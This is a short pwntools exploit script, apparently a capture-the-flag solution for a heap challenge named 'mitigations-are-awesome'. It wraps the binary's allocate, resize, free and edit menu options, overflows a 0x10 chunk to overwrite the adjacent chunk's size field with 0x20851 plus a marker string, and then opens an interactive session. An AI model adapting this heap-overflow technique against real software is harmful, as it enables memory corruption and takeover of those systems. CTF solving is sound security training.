#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./chall", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc mitigations-are-awesome.ctf.umasscybersec.org 1337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        if args.GDB:
            return gdb.debug(args=args_, env=env, gdbscript=gdbscript)
        return process(args_, env=env, *a, **kw)


env = {"FLAG": "fake_flag"}
gdbscript = """
source ~/.gdbinit-gef-bata24.py
"""


def alloc(sz):
    io.sendlineafter(b"to take?\n", b"1")
    io.sendlineafter(b"be?\n", str(sz).encode())
    io.recvuntil(b"at Idx-")
    return int(io.recvline().strip())


def resize(idx, sz):
    io.sendlineafter(b"to take?\n", b"2")
    io.sendlineafter(b"resize?\n", str(idx).encode())
    io.sendlineafter(b"be?\n", str(sz).encode())


def free(idx):
    io.sendlineafter(b"to take?\n", b"2")
    io.sendlineafter(b"resize?\n", str(idx).encode())
    io.sendlineafter(b"be?\n", b"0")


def edit(idx, data):
    io.sendlineafter(b"to take?\n", b"3")
    io.sendlineafter(b"edit?\n", str(idx).encode())
    io.sendlineafter(b"buffer?\n", str(len(data)).encode())
    io.sendafter(b"bounds!\n", data)


io = start()

a = alloc(0x10)
edit(a, b"A" * 0x18 + p64(0x20851) + b"Ez W\x00")
io.sendlineafter(b"to take?\n", b"4")

io.interactive()
